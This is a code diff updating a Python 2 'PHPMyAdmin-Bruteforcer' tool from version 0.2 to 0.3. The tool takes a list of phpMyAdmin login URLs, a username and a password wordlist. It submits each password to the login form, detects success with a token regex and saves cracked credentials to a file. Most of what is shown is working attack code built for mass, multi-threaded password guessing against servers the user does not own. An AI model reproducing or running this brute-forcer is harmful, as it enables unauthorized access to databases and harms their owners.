@@ -23,7 +23,7 @@ banner= """
                        s$$?$  88  $?$$s
                         s$$        $$s
 +--------------------------------------------------------------+
-|                  PHPMyAdmin-Bruteforcer 0.2                  |
+|                  PHPMyAdmin-Bruteforcer 0.3                  |
 |                             ***                              |
 | Greetz fly out to:                                           |
 |  DDR, B2R, BWC, ECB, MLC                                     |
@@ -34,7 +34,7 @@ banner= """
 |  special thanks to whyned for the threading pattern! ♥       |
 |                                                              |
 |                                             author: _bop     |
-|                                             date: 15.03.2015 |
+|                                             date: 20.03.2015 |
 +--------------------------------------------------------------+
 """
 
@@ -47,10 +47,9 @@ class read_file():
          try:
              self.file = open(file, "r+")
          except:
-             print "[-] Error: Cant open File"
-
+             print "[-] Error: Cant open file:",file
+             sys.exit()
          self.actual_line = ""
-
 
     def next_line(self):
          """
@@ -60,10 +59,8 @@ class read_file():
              line = self.file.next().rstrip()
          except StopIteration:
              line = False
-
          except AttributeError:
              line = False
-
          self.actual_line = line
          return line
 
@@ -77,36 +74,37 @@ class read_file():
 class brute():
 
     def __init__(self, user, wordlist, timeout, savefile_validlogin):
-        try:
-            self.words = open(wordlist, "r").readlines()
-            self.user = user
-            self.savefile_validlogin = savefile_validlogin
-            socket.setdefaulttimeout(timeout)  # set timeout for all socket connection (including HTTP requests)
-            if args.verbosity >= 1:
-                print "[+] Info: words loaded: "+str(len(self.words))
-                print "[+] Info: user: "+self.user
-        except(IOError):
-            print "[-] Error: check your wordlist path\n"
-            sys.exit(1)
+        self.user = user
+        self.wordlist = wordlist
+        socket.setdefaulttimeout(timeout) # set timeout for all socket connection (including HTTP requests)
+        self.savefile_validlogin = savefile_validlogin
+        if args.verbosity >= 1:
+            print "[+] Info: password file:", wordlist
+            print "[+] Info: user:", self.user
 
     def pma(self, url):
-
         try:
             found = re.search("http://.*\.php", url)
             url = str(found.group())
         except(AttributeError), msg:
-            print "[-] invalide: "+url
+            print "[-] Warning: invalide url: \""+url+"\""
             return False
 
         if args.verbosity >= 1:
-            print "[-] Info: loaded url: "+url
+            print "[-] Info: url:", url
+        
         cookie_jar = cookielib.CookieJar()
-
-        for word in self.words:
-            word = word.replace("\r","").replace("\n","")
+        passfile = read_file( self.wordlist )
+        while True:
+            password = passfile.next_line()
+            if password == False:
+                if args.verbosity >= 1:
+                    print "[-] Info: Finish!", url
+                break
+            password = password.replace("\r","").replace("\n","")
             login_form_seq = [
                 ('pma_username', self.user),
-                ('pma_password', word),
+                ('pma_password', password),
                 ('server', '1'),
                 ('submit', 'Go'),
                 ('lang', 'en-utf-8'),
@@ -130,22 +128,22 @@ class brute():
             #Change this response if different. (language)
             if re.search("<h1>Error</h1>",site) or re.search("Access denied",site) or re.search("Login without a password is forbidden", site) or re.search("Cannot log in to the MySQL server", site):
                   if args.verbosity == 2:
-                      print "[-] Error: Login Failed: "+word
+                      print "[-] Error: Login Failed: "+password
             #login success
             elif re.search("var token \= [\"\']?[\d\w]{32}[\'\"\ ]?\;", site):
                   if args.verbosity == 2:
-                      print "\n\t[!] Login Successfull:"
+                      print "\n\t[!] Ssuccess: Login:"
                       print url
                       print "User: "+self.user
-                      print "Password: "+word
+                      print "Password: "+password
                       print ""
                   elif args.verbosity == 1:
-                      print "\n[!] Login Successfull: "+url+" ["+self.user+":"+word+"]\n"
+                      print "\n[!] Ssuccess: Login: "+url+" ["+self.user+":"+password+"]\n"
                   else:
-                      print "[!] Login Successfull: "+url+" ["+self.user+":"+word+"]"
+                      print "[!] Ssuccess: Login: "+url+" ["+self.user+":"+password+"]"
                   
                   myFile = open(self.savefile_validlogin, "a")
-                  myFile.write(url+"    ["+self.user+":"+word+"]\n")
+                  myFile.write(url+"    ["+self.user+":"+password+"]\n")
                   myFile.close()
                   break
         return True
@@ -158,14 +156,14 @@ class main():
     def __init__(self, file, user, wordlist, timeout, savefile_validlogin):
         self.file = read_file(file)
         if args.verbosity >= 1:
-            print "[+] Info: urls loaded: "+str(len(self.file))
+            print "[+] Info: PHPMyAdmin file:", file
         self.brute = brute(user, wordlist, timeout, savefile_validlogin)
 
     def run(self, threads):
         threads = int(threads)
         
         if args.verbosity >= 1:
-            print "[~] Info: loaded threads: %s" %threads
+            print "[~] Info: threads: %s" %threads
 
         while True:
             line = self.file.next_line()
